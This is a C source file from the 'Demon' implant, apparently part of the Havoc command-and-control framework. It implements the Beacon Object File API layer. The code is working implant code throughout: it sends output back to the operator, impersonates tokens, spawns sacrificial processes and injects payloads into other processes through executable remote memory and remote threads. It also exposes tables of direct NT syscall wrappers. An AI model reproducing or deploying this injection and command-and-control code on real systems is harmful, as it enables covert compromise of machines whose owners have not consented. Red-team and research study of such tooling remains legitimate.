#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>

#include <Demon.h>
#include <common/Defines.h>
#include <core/Command.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Package.h>
#include <core/SysNative.h>
#include <core/ObjectApi.h>


#ifndef bufsize
#define bufsize 8192
#endif

// Meh some wrapper functions for internal demon GetProcAddress and GetModuleHandleA functions.
PVOID LdrModulePebString( PCHAR ModuleString )
{
    PRINTF( "ModuleString: %s : %lx\n", ModuleString, HashEx( ModuleString, 0, TRUE ) )
    return Instance->Win32.GetModuleHandleA( ModuleString );
}

PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
{
    PRINTF( "Module:[%p] Function:[%s : %lx]\n", Module, Function, HashEx( Function, 0, TRUE ) )
    return LdrFunctionAddr( Module, HashEx( Function, 0, TRUE ) );
}

BOOL LdrFreeLibrary( HMODULE hLibModule )
{
    return Instance->Win32.FreeLibrary( hLibModule );
}

HLOCAL LdrLocalFree( PVOID hMem )
{
    return Instance->Win32.LocalFree( hMem );
}

COFFAPIFUNC BeaconApi[] = {
        { .NameHash = H_COFFAPI_BEACONDATAPARSER,             .Pointer = BeaconDataParse                  },
        { .NameHash = H_COFFAPI_BEACONDATAINT,                .Pointer = BeaconDataInt                    },
        { .NameHash = H_COFFAPI_BEACONDATASHORT,              .Pointer = BeaconDataShort                  },
        { .NameHash = H_COFFAPI_BEACONDATALENGTH,             .Pointer = BeaconDataLength                 },
        { .NameHash = H_COFFAPI_BEACONDATAEXTRACT,            .Pointer = BeaconDataExtract                },
        { .NameHash = H_COFFAPI_BEACONFORMATALLOC,            .Pointer = BeaconFormatAlloc                },
        { .NameHash = H_COFFAPI_BEACONFORMATRESET,            .Pointer = BeaconFormatReset                },
        { .NameHash = H_COFFAPI_BEACONFORMATFREE,             .Pointer = BeaconFormatFree                 },
        { .NameHash = H_COFFAPI_BEACONFORMATAPPEND,           .Pointer = BeaconFormatAppend               },
        { .NameHash = H_COFFAPI_BEACONFORMATPRINTF,           .Pointer = BeaconFormatPrintf               },
        { .NameHash = H_COFFAPI_BEACONFORMATTOSTRING,         .Pointer = BeaconFormatToString             },
        { .NameHash = H_COFFAPI_BEACONFORMATINT,              .Pointer = BeaconFormatInt                  },
        { .NameHash = H_COFFAPI_BEACONPRINTF,                 .Pointer = BeaconPrintf                     },
        { .NameHash = H_COFFAPI_BEACONOUTPUT,                 .Pointer = BeaconOutput                     },
        { .NameHash = H_COFFAPI_BEACONUSETOKEN,               .Pointer = BeaconUseToken                   },
        { .NameHash = H_COFFAPI_BEACONREVERTTOKEN,            .Pointer = TokenRevSelf                     },
        { .NameHash = H_COFFAPI_BEACONISADMIN,                .Pointer = BeaconIsAdmin                    },
        { .NameHash = H_COFFAPI_BEACONGETSPAWNTO,             .Pointer = BeaconGetSpawnTo                 },
        { .NameHash = H_COFFAPI_BEACONINJECTPROCESS,          .Pointer = BeaconInjectProcess              },
        { .NameHash = H_COFFAPI_BEACONSPAWNTEMPORARYPROCESS,  .Pointer = BeaconSpawnTemporaryProcess      },
        { .NameHash = H_COFFAPI_BEACONINJECTTEMPORARYPROCESS, .Pointer = BeaconInjectTemporaryProcess     },
        { .NameHash = H_COFFAPI_BEACONCLEANUPPROCESS,         .Pointer = BeaconCleanupProcess             },
        { .NameHash = H_COFFAPI_BEACONINFORMATION,            .Pointer = BeaconInformation                },
        { .NameHash = H_COFFAPI_BEACONADDVALUE,               .Pointer = BeaconAddValue                   },
        { .NameHash = H_COFFAPI_BEACONGETVALUE,               .Pointer = BeaconGetValue                   },
        { .NameHash = H_COFFAPI_BEACONREMOVEVALUE,            .Pointer = BeaconRemoveValue                },
        { .NameHash = H_COFFAPI_BEACONDATASTOREGETITEM,       .Pointer = BeaconDataStoreGetItem           },
        { .NameHash = H_COFFAPI_BEACONDATASTOREPROTECTITEM,   .Pointer = BeaconDataStoreProtectItem       },
        { .NameHash = H_COFFAPI_BEACONDATASTOREUNPROTECTITEM, .Pointer = BeaconDataStoreUnprotectItem     },
        { .NameHash = H_COFFAPI_BEACONDATASTOREMAXENTRIES,    .Pointer = BeaconDataStoreMaxEntries        },
        { .NameHash = H_COFFAPI_BEACONGETCUSTOMUSERDATA,      .Pointer = BeaconGetCustomUserData          },

        // End of array
        { .NameHash = 0, .Pointer = NULL },
};

COFFAPIFUNC LdrApi[] = {
        { .NameHash = H_COFFAPI_TOWIDECHAR,                   .Pointer = toWideChar                       },
        { .NameHash = H_COFFAPI_LOADLIBRARYA,                 .Pointer = LdrModuleLoad                    },
        { .NameHash = H_COFFAPI_GETMODULEHANDLE,              .Pointer = LdrModulePebString               },
        { .NameHash = H_COFFAPI_GETPROCADDRESS,               .Pointer = LdrFunctionAddrString            },
        { .NameHash = H_COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   },
        { .NameHash = H_COFFAPI_LOCALFREE,                    .Pointer = LdrLocalFree                     },

        // End of array
        { .NameHash = 0, .Pointer = NULL },
};

COFFAPIFUNC NtApi[] = {
        { .NameHash = H_COFFAPI_NTOPENTHREAD,                   .Pointer = SysNtOpenThread                   },
        { .NameHash = H_COFFAPI_NTOPENPROCESS,                  .Pointer = SysNtOpenProcess                  },
        { .NameHash = H_COFFAPI_NTTERMINATEPROCESS,             .Pointer = SysNtTerminateProcess             },
        { .NameHash = H_COFFAPI_NTOPENTHREADTOKEN,              .Pointer = SysNtOpenThreadToken              },
        { .NameHash = H_COFFAPI_NTOPENPROCESSTOKEN,             .Pointer = SysNtOpenProcessToken             },
        { .NameHash = H_COFFAPI_NTDUPLICATETOKEN,               .Pointer = SysNtDuplicateToken               },
        { .NameHash = H_COFFAPI_NTQUEUEAPCTHREAD,               .Pointer = SysNtQueueApcThread               },
        { .NameHash = H_COFFAPI_NTSUSPENDTHREAD,                .Pointer = SysNtSuspendThread                },
        { .NameHash = H_COFFAPI_NTRESUMETHREAD,                 .Pointer = SysNtResumeThread                 },
        { .NameHash = H_COFFAPI_NTCREATEEVENT,                  .Pointer = SysNtCreateEvent                  },
        { .NameHash = H_COFFAPI_NTCREATETHREADEX,               .Pointer = SysNtCreateThreadEx               },
        { .NameHash = H_COFFAPI_NTDUPLICATEOBJECT,              .Pointer = SysNtDuplicateObject              },
        { .NameHash = H_COFFAPI_NTGETCONTEXTTHREAD,             .Pointer = SysNtGetContextThread             },
        { .NameHash = H_COFFAPI_NTSETCONTEXTTHREAD,             .Pointer = SysNtSetContextThread             },
        { .NameHash = H_COFFAPI_NTQUERYINFORMATIONPROCESS,      .Pointer = SysNtQueryInformationProcess      },
        { .NameHash = H_COFFAPI_NTQUERYSYSTEMINFORMATION,       .Pointer = SysNtQuerySystemInformation       },
        { .NameHash = H_COFFAPI_NTWAITFORSINGLEOBJECT,          .Pointer = SysNtWaitForSingleObject          },
        { .NameHash = H_COFFAPI_NTALLOCATEVIRTUALMEMORY,        .Pointer = SysNtAllocateVirtualMemory        },
        { .NameHash = H_COFFAPI_NTWRITEVIRTUALMEMORY,           .Pointer = SysNtWriteVirtualMemory           },
        { .NameHash = H_COFFAPI_NTFREEVIRTUALMEMORY,            .Pointer = SysNtFreeVirtualMemory            },
        { .NameHash = H_COFFAPI_NTUNMAPVIEWOFSECTION,           .Pointer = SysNtUnmapViewOfSection           },
        { .NameHash = H_COFFAPI_NTPROTECTVIRTUALMEMORY,         .Pointer = SysNtProtectVirtualMemory         },
        { .NameHash = H_COFFAPI_NTREADVIRTUALMEMORY,            .Pointer = SysNtReadVirtualMemory            },
        { .NameHash = H_COFFAPI_NTTERMINATETHREAD,              .Pointer = SysNtTerminateThread              },
        { .NameHash = H_COFFAPI_NTALERTRESUMETHREAD,            .Pointer = SysNtAlertResumeThread            },
        { .NameHash = H_COFFAPI_NTSIGNALANDWAITFORSINGLEOBJECT, .Pointer = SysNtSignalAndWaitForSingleObject },
        { .NameHash = H_COFFAPI_NTQUERYVIRTUALMEMORY,           .Pointer = SysNtQueryVirtualMemory           },
        { .NameHash = H_COFFAPI_NTQUERYINFORMATIONTOKEN,        .Pointer = SysNtQueryInformationToken        },
        { .NameHash = H_COFFAPI_NTQUERYINFORMATIONTHREAD,       .Pointer = SysNtQueryInformationThread       },
        { .NameHash = H_COFFAPI_NTQUERYOBJECT,                  .Pointer = SysNtQueryObject                  },
        { .NameHash = H_COFFAPI_NTCLOSE,                        .Pointer = SysNtClose                        },
        { .NameHash = H_COFFAPI_NTSETINFORMATIONTHREAD,         .Pointer = SysNtSetInformationThread         },
        { .NameHash = H_COFFAPI_NTSETINFORMATIONVIRTUALMEMORY,  .Pointer = SysNtSetInformationVirtualMemory  },
        { .NameHash = H_COFFAPI_NTGETNEXTTHREAD,                .Pointer = SysNtGetNextThread                },

        // End of array
        { .NameHash = 0, .Pointer = NULL },
};

uint32_t swap_endianness(uint32_t indata) {
    uint32_t testint = 0xaabbccdd;
    uint32_t outint = indata;
    if (((unsigned char*)&testint)[0] == 0xdd) {
        ((unsigned char*)&outint)[0] = ((unsigned char*)&indata)[3];
        ((unsigned char*)&outint)[1] = ((unsigned char*)&indata)[2];
        ((unsigned char*)&outint)[2] = ((unsigned char*)&indata)[1];
        ((unsigned char*)&outint)[3] = ((unsigned char*)&indata)[0];
    }
    return outint;
}

VOID BeaconDataParse( PDATA parser, PCHAR buffer, INT size )
{
    if ( parser == NULL )
        return;

    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size - 4;
    parser->size     = size - 4;
    parser->buffer   += 4;
}

INT BeaconDataInt( PDATA parser )
{
    UINT32 Value = 0;

    if ( parser->length < 4 )
        return 0;

    MemCopy( &Value, parser->buffer, 4 );

    parser->buffer += 4;
    parser->length -= 4;

    return ( INT ) Value;
}

SHORT BeaconDataShort( datap* parser )
{
    UINT16 Value = 0;

    if ( parser->length < 2 )
        return 0;

    MemCopy( &Value, parser->buffer, 2 );

    parser->buffer += 2;
    parser->length -= 2;

    return ( short ) Value;
}

INT BeaconDataLength( PDATA parser )
{
    return parser->length;
}

PCHAR BeaconDataExtract( PDATA parser, PINT size )
{
    INT   Length = 0;
    PVOID Data   = NULL;

    if ( parser->length < 4 )
        return NULL;

    MemCopy( &Length, parser->buffer, 4 );

    parser->buffer += 4;

    Data = parser->buffer;
    if ( Data == NULL )
        return NULL;

    parser->length -= 4;
    parser->length -= Length;
    parser->buffer += Length;

    if ( size != NULL )
        *size = Length;

    return Data;
}

/*
 * This function is called by BeaconPrintf and BeaconOutput.
 * It loops over all the COFFEE structs saved on the Instance object
 * trying to find which BOF called BeaconPrintf/BeaconOutput
 * once it finds it, it returns the RequestID
 * this is so that the TS can identify which BOF is sending the output data.
 * This is needed because you can have more than one BOF mapped in memory at the same time
 */
BOOL GetRequestIDForCallingObjectFile( PVOID CoffeeFunctionReturn, PUINT32 RequestID )
{
    PCOFFEE Entry = Instance->Coffees;

    if ( ! CoffeeFunctionReturn || ! RequestID )
        return FALSE;

    while ( Entry )
    {
        if ( ( ULONG_PTR ) CoffeeFunctionReturn >= ( ULONG_PTR ) Entry->ImageBase && ( ULONG_PTR ) CoffeeFunctionReturn < ( ( ULONG_PTR ) Entry->ImageBase + Entry->BofSize ) )
        {
            //PRINTF( "Found the RequestID for the calling BOF: %x\n", Entry->RequestID )
            *RequestID = Entry->RequestID;
            return TRUE;
        }

        Entry = Entry->Next;
    }

    PUTS( "Failed to find the RequestID for the calling BOF" )

    return FALSE;
}

VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
{
    //PRINTF( "BeaconPrintf( %d, %x, ... )\n", Type, fmt )

    PPACKAGE    package              = NULL;
    va_list     VaListArg            = 0;
    PVOID       CallbackOutput       = NULL;
    INT         CallbackSize         = 0;
    UINT32      RequestID            = 0;
    PVOID       CoffeeFunctionReturn = __builtin_return_address( 0 );

    if ( ! fmt ) {
        PUTS( "Format string can't be NULL" );
        return;
    }

    if ( GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) )
        package = PackageCreateWithRequestID( BEACON_OUTPUT, RequestID );
    else
        package = PackageCreate( BEACON_OUTPUT );

    va_start( VaListArg, fmt );

    CallbackSize = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg );
    if ( CallbackSize < 0 ) {
        PUTS( "Failed to calculate final string length" )
        va_end( VaListArg );
        return;
    }

    CallbackOutput = Instance->Win32.LocalAlloc( LPTR, CallbackSize + 1 );
    if ( ! CallbackOutput ) {
        PUTS( "Failed to allocate CallbackOutput" );
        va_end( VaListArg );
        return;
    }

    if ( Instance->Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg ) < 0 ) {
        PUTS( "Failed to format string" )
        MemSet( CallbackOutput, 0, CallbackSize );
        Instance->Win32.LocalFree( CallbackOutput );
        va_end( VaListArg );
        return;
    }

    va_end( VaListArg );

    PRINTF( "CallbackOutput[%d]: \n%s\n", CallbackSize, CallbackOutput );

    PackageAddInt32( package, Type );
    PackageAddBytes( package, CallbackOutput, CallbackSize );
    PackageTransmit( package );

    MemSet( CallbackOutput, 0, CallbackSize );
    Instance->Win32.LocalFree( CallbackOutput );
}

VOID BeaconOutput( INT Type, PCHAR data, INT len )
{
    PRINTF( "BeaconOutput( %d, %p, %d )\n", Type, data, len )

    UINT32   RequestID            = 0;
    PPACKAGE Package              = NULL;
    PVOID    CoffeeFunctionReturn = __builtin_return_address( 0 );

    if ( GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) ) {
        Package = PackageCreateWithRequestID( BEACON_OUTPUT, RequestID );
    } else {
        Package = PackageCreate( BEACON_OUTPUT );
    }

    PackageAddInt32( Package, Type );
    PackageAddBytes( Package, ( PBYTE ) data, len );
    PackageTransmit( Package );
}

BOOL BeaconIsAdmin(
    VOID
) {
    HANDLE Token = { 0 };
    BOOL   Admin = FALSE;

    /* query if current process token is elevated or not */
    if ( ( Token = TokenCurrentHandle() ) ) {
        Admin = TokenElevated( Token );
    }

    /* close token handle */
    if ( Token ) {
        SysNtClose( Token );
    }

    return Admin;
}

VOID BeaconFormatAlloc( PFORMAT format, int maxsz )
{
    if ( format == NULL )
        return;

    format->original = Instance->Win32.LocalAlloc(maxsz, 1);
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
}

VOID BeaconFormatReset( PFORMAT format )
{
    MemSet( format->original, 0, format->size );
    format->buffer = format->original;
    format->length = format->size;
}

VOID BeaconFormatFree( PFORMAT format )
{
    if ( format == NULL )
        return;

    if ( format->original )
    {
        Instance->Win32.LocalFree( format->original );
        format->original = NULL;
    }

    format->buffer = NULL;
    format->length = 0;
    format->size   = 0;
}

VOID BeaconFormatAppend( PFORMAT format, char* text, int len )
{
    MemCopy( format->buffer, text, len );
    format->buffer += len;
    format->length += len;
}

VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )
{
    va_list args   = { 0 };
    int     length = 0;

    va_start( args, fmt );
    length = Instance->Win32.vsnprintf( NULL, 0, fmt, args );
    va_end( args );
    if ( format->length + length > format->size )
    {
        return;
    }

    va_start( args, fmt );
    Instance->Win32.vsnprintf( format->buffer, length, fmt, args );
    va_end( args );

    format->length += length;
    format->buffer += length;
}

char* BeaconFormatToString( PFORMAT format, int* size)
{
    *size = format->length;
    return format->original;
}

VOID BeaconFormatInt( PFORMAT format, int value)
{
    uint32_t indata = value;
    uint32_t outdata = 0;
    if (format->length + 4 > format->size) {
        return;
    }
    outdata = swap_endianness(indata);
    MemCopy(format->buffer, &outdata, 4);
    format->length += 4;
    format->buffer += 4;
    return;
}

BOOL BeaconUseToken( HANDLE token )
{
    HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;

    if ( ! SysNtDuplicateToken( token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken ) ) {
        return FALSE;
    }

    if ( ! Instance->Win32.SetThreadToken( NULL, hImpersonateToken ) ) {
        return FALSE;
    }

    return TRUE;
}

VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
{
    PWCHAR Path = NULL;
    SIZE_T Size = 0;

    if ( ! buffer )
        return;

    if ( x86 ) {
        Path = Instance->Config.Process.Spawn86;
    } else {
        Path = Instance->Config.Process.Spawn64;
    }

    Size = StringLengthW( Path ) * sizeof( WCHAR );

    if ( Size > length ) {
        return;
    }

    MemCopy( buffer, Path, Size );
}

BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo )
{
    BOOL    bSuccess    = FALSE;
    HANDLE  hToken      = INVALID_HANDLE_VALUE;
    PWCHAR  Path        = NULL;

    if (x86) {
        Path = Instance->Config.Process.Spawn86;
    } else {
        Path = Instance->Config.Process.Spawn64;
    }

    if (ignoreToken)
    {
        bSuccess = Instance->Win32.CreateProcessW(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
    }
    else
    {
        bSuccess = Instance->Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, Path, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, sInfo, pInfo);
    }

    return bSuccess;
}

VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char * arg, int a_len )
{
    PVOID             a_RemoteBuf      = NULL;
    PVOID             p_RemoteBuf      = NULL;
    SIZE_T            Size             = 0;
    NTSTATUS          Status           = STATUS_SUCCESS;
    CLIENT_ID         ClientID         = { 0 } ;
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };

    InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );

    if ( ! hProc ) {
        hProc = ProcessOpen( pid, PROCESS_ALL_ACCESS );
        if ( ! hProc ) {
            return;
        }
    }

    // allocate memory space for payload
    Size = p_len * sizeof( CHAR );
    Status = SysNtAllocateVirtualMemory(hProc, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if ( ! NT_SUCCESS( Status ) )
        return;

    Status = SysNtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
    if ( ! NT_SUCCESS( Status ) )
        return;

    // allocate memory space for argument
    Size = a_len * sizeof( CHAR );
    Status = SysNtAllocateVirtualMemory(hProc, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if ( ! NT_SUCCESS( Status ) )
        return;

    Status = SysNtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
    if ( ! NT_SUCCESS( Status ) )
        return;

    Status = SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
    if ( ! NT_SUCCESS( Status ) )
        return;
}

VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len )
{
    PVOID p_RemoteBuf;
    PVOID a_RemoteBuf;
    SIZE_T Size;
    NTSTATUS Status;

    // allocate memory space for payload
    Size = p_len * sizeof(char);
    Status = SysNtAllocateVirtualMemory(pInfo->hProcess, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    Status = SysNtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    // allocate memory space for argument
    Size = a_len * sizeof(char);
    Status = SysNtAllocateVirtualMemory(pInfo->hProcess, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    Status = SysNtWriteVirtualMemory(pInfo->hProcess, a_RemoteBuf, (PVOID)arg, Size, 0);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
}

VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
{
    NTSTATUS status;

    status = SysNtClose(pInfo->hProcess);
    if (status != STATUS_SUCCESS)
        return;

    status = SysNtClose(pInfo->hThread);
    if (status != STATUS_SUCCESS)
        return;
}

// not implemented
VOID BeaconInformation(BEACON_INFO * info)
{
    PUTS( "BeaconInformation is not implemented" );
    return;
}

BOOL BeaconAddValue(const char * key, void * ptr)
{
    PCOFFEE_KEY_VALUE KeyValue  = NULL;
    SIZE_T            KeyLength = 0;

    if ( ! key )
    {
        PUTS( "No key was provided" );
        return FALSE;
    }

    KeyLength = StringLengthA( key );

    if ( KeyLength == 0 )
    {
        PUTS( "The key is too short" );
        return FALSE;
    }

    if ( KeyLength >= COFFEE_KEY_VALUE_MAX_KEY )
    {
        PRINTF( "The key %s is too long\n", key );
        return FALSE;
    }

    // make sure the key doesn't already exist
    KeyValue = Instance->CoffeKeyValueStore;
    while ( KeyValue )
    {
        if ( StringCompareA( KeyValue->Key, key ) == 0 ) {
            PRINTF( "The key %s already exists\n", key );
            return FALSE;
        }

        KeyValue = KeyValue->Next;
    }

    KeyValue = Instance->Win32.LocalAlloc( LPTR, sizeof( COFFEE_KEY_VALUE ) );

    KeyValue->Value = ptr;
    StringCopyA( KeyValue->Key, key );

    // store the new item at the start of the list
    KeyValue->Next = Instance->CoffeKeyValueStore;
    Instance->CoffeKeyValueStore = KeyValue;

    return TRUE;
}

PVOID BeaconGetValue(const char * key)
{
    PCOFFEE_KEY_VALUE KeyValue = NULL;

    if ( ! key )
    {
        PUTS( "No key was provided" );
        return NULL;
    }

    KeyValue = Instance->CoffeKeyValueStore;
    while ( KeyValue )
    {
        if ( StringCompareA( KeyValue->Key, key ) == 0 ) {
            return KeyValue->Value;
        }

        KeyValue = KeyValue->Next;
    }

    return NULL;
}

BOOL BeaconRemoveValue(const char * key)
{
    PCOFFEE_KEY_VALUE Current  = NULL;
    PCOFFEE_KEY_VALUE Prev     = NULL;

    if ( ! key )
    {
        PUTS( "No key was provided" );
        return FALSE;
    }

    Current = Instance->CoffeKeyValueStore;
    while ( Current )
    {
        if ( StringCompareA( Current->Key, key ) == 0 )
        {
            if ( Prev ) {
                Prev->Next = Current->Next;
            } else {
                Instance->CoffeKeyValueStore = Current->Next;
            }

            DATA_FREE( Current, sizeof( COFFEE_KEY_VALUE ) );
            return TRUE;
        }

        Prev    = Current;
        Current = Current->Next;
    }

    return FALSE;
}

// not implemented
PDATA_STORE_OBJECT BeaconDataStoreGetItem(SIZE_T index)
{
    PUTS( "BeaconDataStoreGetItem is not implemented" );
    return NULL;
}

// not implemented
VOID BeaconDataStoreProtectItem(SIZE_T index)
{
    PUTS( "BeaconDataStoreProtectItem is not implemented" );
    return;
}

// not implemented
VOID BeaconDataStoreUnprotectItem(SIZE_T index)
{
    PUTS( "BeaconDataStoreUnprotectItem is not implemented" );
    return;
}

// not implemented
SIZE_T BeaconDataStoreMaxEntries()
{
    PUTS( "BeaconDataStoreMaxEntries is not implemented" );
    return 0;
}

// not implemented
PCHAR BeaconGetCustomUserData()
{
    PUTS( "BeaconGetCustomUserData is not implemented" );
    return NULL;
}

BOOL toWideChar( char* src, wchar_t* dst, int max )
{
    SIZE_T Length = 0;

    Length = CharStringToWCharString(dst, src, max);
    if (Length == 0) {
        return FALSE;
    }

    return TRUE;
}
